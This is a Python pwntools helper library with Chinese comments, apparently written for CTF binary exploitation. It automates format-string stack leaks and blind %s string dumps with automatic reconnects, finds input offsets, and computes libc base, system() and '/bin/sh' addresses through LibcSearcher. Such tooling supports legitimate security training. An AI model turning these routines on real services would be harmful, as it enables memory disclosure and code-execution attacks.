from __future__ import annotations

import time
from typing import Any, Callable, Optional, Union

from pwn import ELF, args, context, gdb, log, pause, process, remote


class MyTool:
    # 显式声明类型，这是给 Pyright 这种静态分析工具看的
    elf: ELF
    libc: ELF

    def __init__(
        self,
        file_path: str,
        libc_path: str | None = None,
        log_level: str = "debug",
    ) -> None:
        # 用于集中存储泄漏地址的字典
        self.leaks_data: dict[str, Any] = {}
        # 基础环境配置
        context.log_level = log_level
        context.terminal = ["tmux", "splitw", "-h"]  # 既然你用 Kitty+Tmux，这行是刚需
        # 自动加载 ELF
        self.elf = context.binary = ELF(
            file_path, checksec=False
        )  # 关掉 checksec 让画面更干净
        if libc_path:
            self.libc = ELF(libc_path, checksec=False)
            log.info("成功加载本地libc")
        else:  # Type Narrowing（类型收窄）
            # 1. 先用一个临时变量接住，此时 _temp 是 ELF | None
            _temp = self.elf.libc
            # 2. 进行显式的非空检查
            if _temp is None:
                log.warning("无法自动加载 Libc，请手动指定 libc_path")
            # 3. 经过上面的 if，Pyright 确信 _temp 现在一定是 ELF 类型
            else:
                self.libc = _temp
                log.info("成功自动关联系统libc")

    def start(self, host=None, port=None) -> process | remote:
        if args.REMOTE:
            # 只有在输入 REMOTE 参数时才连接远程
            log.info("Starting Remote Connection...")
            context.log_level = "INFO"
            return remote(host, port)
        else:
            # 默认本地
            io = process()
            return io

    def gdb(
        self, io: process | remote, gdbscript: str = "", show_leaks: bool = True
    ) -> None:
        """
        挂载 GDB 调试。
        如果在挂载前已经有了泄漏数据，且 show_leaks 为 True，则自动打印汇总表。
        """
        if args.GDB and isinstance(io, process):
            # 智能判断：如果有数据，且用户没强制关闭显示，则打印
            if show_leaks and hasattr(self, "leaks_data") and self.leaks_data:
                self.puts_log()

            gdb.attach(io, gdbscript=gdbscript)
            pause()
        elif args.GDB and isinstance(io, remote):
            log.warn("GDB attach is not supported for remote connections!")

    def itob(self, num: int) -> bytes:
        return str(num).encode()

    def leak_stack(self, io: remote, until: bytes, cyclc: int) -> None:
        for i in range(1, cyclc):
            io.recvuntil(until)
            # 构造类似 %11$p 的 payload，确保在 7 字节内
            payload = f"%{i}$p"
            io.sendline(payload.encode())
            res = io.recvline()
            print(f"Index {i}: {res.decode().strip()}")

    def add_log(
        self, name: Optional[str] = None, value: Any = None, **kwargs: Any
    ) -> None:
        """
        添加泄漏数据到统一列表，支持两种调用方式：
        1. 动态变量: t.add_log(name, leak_addr)  -> 常用在循环 leak
        2. 关键字:   t.add_log(libc_base=base)   -> 常用在固定偏移计算
        """
        # 方式 1: 处理位置参数 (name, value)
        if name is not None and value is not None:
            self.leaks_data[str(name)] = value

        # 方式 2: 处理关键字参数 (**kwargs)
        for k, v in kwargs.items():
            self.leaks_data[k] = v

    def puts_log(self) -> None:
        """
        集中高亮打印所有记录的泄漏地址。
        自动识别整数并转为 16 进制，优化了对齐间距。
        """
        if not self.leaks_data:
            log.warning("⚠️ 没有记录任何泄漏地址！")
            return

        print("\n" + "═" * 50)
        log.success("🏆 L E A K   S U M M A R Y 🏆")
        print("─" * 50)

        for name, value in self.leaks_data.items():
            # 格式化逻辑：如果是整数（地址），转为 16 进制并补位
            if isinstance(value, int):
                # 针对 64 位地址通常显示 12 位有效数字，32 位显示 8 位
                formatted_value = (
                    f"{value:#014x}" if value > 0xFFFFFFFF else f"{value:#010x}"
                )
            else:
                formatted_value = str(value)

            # 使用左对齐 18 字符，确保冒号整齐划一
            log.info(f"{name:<18} : {formatted_value}")

        print("═" * 50 + "\n")

    def auto_search_libc(self) -> dict:
        """
        利用已记录的 self.leaks_data 自动匹配 Libc，
        计算并记录 libc_base, system_addr 和 str_bin_sh_addr。
        返回包含这三个关键地址的字典。
        """
        # 如果你的环境中 LibcSearcher 导入方式不同，请在此调整
        try:
            from LibcSearcher import LibcSearcher
        except ImportError:
            log.error("未找到 LibcSearcher 模块，请先安装！")
            return {}

        if not self.leaks_data:
            log.error("❌ 没有任何泄漏数据，无法进行 Libc 搜索！")
            return {}

        # 1. 提取字典中的项
        # 注意：这里我们过滤出值为整数的项，防止把非地址的 log 传进去
        valid_leaks = {k: v for k, v in self.leaks_data.items() if isinstance(v, int)}
        if not valid_leaks:
            log.error("❌ 没有有效的地址数据用于 Libc 搜索！")
            return {}

        items = list(valid_leaks.items())
        first_name, first_addr = items[0]

        # 2. 初始化 LibcSearcher
        log.info(f"🔍 启动 LibcSearcher，初始条件: {first_name} = {hex(first_addr)}")
        libc = LibcSearcher(first_name, first_addr)

        # 3. 追加其他约束条件（提高匹配精准度）
        for name, addr in items[1:]:
            log.info(f"➕ 添加约束条件: {name} = {hex(addr)}")
            libc.add_condition(name, addr)

        # 4. 计算基址与关键函数/字符串地址
        # ⚠️ 注意：如果匹配到多个 Libc，dump 时终端会暂停，要求你手动输入序号选择
        try:
            libc_base = first_addr - libc.dump(first_name)
            system_addr = libc_base + libc.dump("system")
            str_bin_sh = libc_base + libc.dump("str_bin_sh")
        except Exception as e:
            log.error(f"❌ Libc 匹配或 Dump 失败: {e}")
            return {}

        # 5. 使用刚才写好的 add_log 自动存入日志库
        self.add_log(libc_base=libc_base, system=system_addr, bin_sh=str_bin_sh)
        log.success("🎉 Libc 数据解析完毕并已自动记录！")

        # 返回字典方便主脚本直接使用
        return {
            "libc_base": libc_base,
            "system_addr": system_addr,
            "str_bin_sh": str_bin_sh,
        }


# 使用示例
# t = MyTool("./ez_uaf")
# io = t.start() # 本地调试
# io = t.start("r", "1.1.1.1", 10001) # 远程攻击


class BlindFmtTool:
    """
    专门针对无本地 ELF 文件的盲注 (Blind Pwn) 工具类。
    支持自动重连、格式化字符串栈泄露、内存字符串探测。
    """

    # 显式类型声明，对 Pyright 友好
    io_factory: Callable[[], process | remote]
    interact_func: Callable[[process | remote, bytes], Optional[bytes]]
    current_io: process | remote | None
    arch: int
    delay: float

    def __init__(
        self,
        io_factory: Callable[[], process | remote],
        interact_func: Callable[[process | remote, bytes], Optional[bytes]],
        arch: int = 64,
        delay: float = 0.1,
    ) -> None:
        """
        :param io_factory: 一个返回 process 或 remote 对象的无参函数，用于程序崩溃时自动重连。
        :param interact_func: 定义如何发送 payload 并提取返回结果的函数。如果返回 None 代表目标崩溃或超时。
        :param arch: 目标架构位数，默认为 64 (影响指针解包大小)。
        :param delay: 每次发包之间的延迟，防止被远程服务器当成 CC 攻击给 ban 掉。
        """
        self.io_factory = io_factory
        self.interact_func = interact_func
        self.arch = arch
        self.delay = delay
        self.current_io = None

        # 确保有一个初始连接
        self._ensure_connection()

    def _ensure_connection(self) -> process | remote:
        """检查并维护连接状态，如果断开则重新连接"""
        if self.current_io is None:
            self.current_io = self.io_factory()
            # 设置 pwntools 的超时时间，防止 recv 卡死
            self.current_io.timeout = 2
        return self.current_io

    def _safe_interact(self, payload: bytes) -> Optional[bytes]:
        """安全地执行交互，捕获 EOFError 等异常，并在需要时触发重连"""
        io = self._ensure_connection()
        time.sleep(self.delay)

        try:
            # 调用用户自定义的交互逻辑
            result = self.interact_func(io, payload)
            if result is None:
                raise EOFError("Interact function returned None")
            return result
        except (EOFError, BrokenPipeError, ConnectionResetError):
            log.warning(
                f"Payload [{payload.decode(errors='ignore')}] 导致程序崩溃或断开，正在准备重连..."
            )
            if self.current_io:
                self.current_io.close()
            self.current_io = None
            return None
        except Exception as e:
            log.error(f"发生未知错误: {e}")
            return None

    def dump_stack_ptrs(
        self, start_idx: int = 1, end_idx: int = 50, fast: bool = True
    ) -> dict[int, str]:
        """
        连续泄露栈上的指针 (使用 %p)，用于寻找返回地址、Canary 或基址。
        """
        log.info(
            f"开始泄露栈指针，范围: %{start_idx}$p 到 %{end_idx}$p|模式: {'快速' if fast else '安全'}"
        )
        results: dict[int, str] = {}
        self.offest = -1
        original_delay = self.delay
        if fast:
            self.delay = 0.0
        for i in range(start_idx, end_idx + 1):
            # 盲注时，尽量保持 payload 最简短
            payload = f"%{i}$p".encode()
            res = self._safe_interact(payload)
            if res:
                clean_res = res.decode(errors="ignore").strip()
                results[i] = clean_res

                # --- 核心命中逻辑 ---
                # 检查返回的十六进制里是否包含 '$' (24) 和 '%' (25) 的特征
                # 只要包含 2425 (即 $%)，基本可以确定这就是 Offset 位
                if "2425" in clean_res or "7024" in clean_res:
                    self.offset = i
                    print(
                        f" \033[1;32m[!] HIT TARGET! Offset Found -> %{i}$p ({clean_res})\033[0m"
                    )
                else:
                    # 10 = logging.DEBUG, 20 = logging.INFO
                    if str(context.log_level).upper() != "DEBUG":
                        print(f"[{i:02d}] {clean_res}")
            # ------------------
            else:
                print(f"[{i:02d}] <Crash!>")
        # 恢复原有的延迟设置
        self.delay = original_delay
        if self.offset != -1:
            log.success(f"探测完成！最终确认输入偏移 Offset: {self.offset}")
        return results

    def dump_strings(self, start_idx: int = 1, end_idx: int = 50) -> dict[int, bytes]:
        """
        高危操作：尝试将栈上的指针作为字符串打印出来 (使用 %s)。
        极易导致程序崩溃 (Segfault)，所以依赖自动重连机制。
        通常用于盲找 Flag 或环境变量。
        """
        log.info(f"开始盲猜栈上字符串，范围: %{start_idx}$s 到 %{end_idx}$s")
        results: dict[int, bytes] = {}

        for i in range(start_idx, end_idx + 1):
            payload = f"%{i}$s".encode()
            res = self._safe_interact(payload)

            if res:
                results[i] = res
                try:
                    # 尝试用可见字符打印
                    log.success(f"Index {i} 命中字符串: {res.decode(errors='ignore')}")
                except Exception:
                    log.success(f"Index {i} 命中二进制数据 (Hex): {res.hex()}")
            else:
                log.debug(f"Index {i}: 地址不可读导致崩溃 (正常现象)")

        return results

    def find_input_offset(self, marker: bytes = b"PwnTool", max_range: int = 30) -> int:
        """
        自动计算我们的输入落在栈上的第几个参数 (Offset)。
        这对于后续构造任意地址读写 (Arbitrary Read/Write) 是必须的先决条件。
        """
        log.info(f"正在寻找输入偏移，标记: {marker.decode(errors='ignore')}")

        for i in range(1, max_range + 1):
            # 构造如 "PwnTool|%10$p"
            payload = marker + b"|%" + str(i).encode() + b"$p"
            res = self._safe_interact(payload)

            if res:
                res_str = res.decode(errors="ignore")
                # 将 marker 转为小端序 Hex，看是否出现在 %p 的输出中
                # 这里做个简化判断，实际情况可能需要字节对齐
                hex_marker = marker[::-1].hex()
                if hex_marker in res_str.replace("0x", ""):
                    log.success(f"找到偏移点！Offset = {i}")
                    return i

        log.warning("未找到输入偏移，可能受限于缓冲区大小或栈结构特殊。")
        return -1
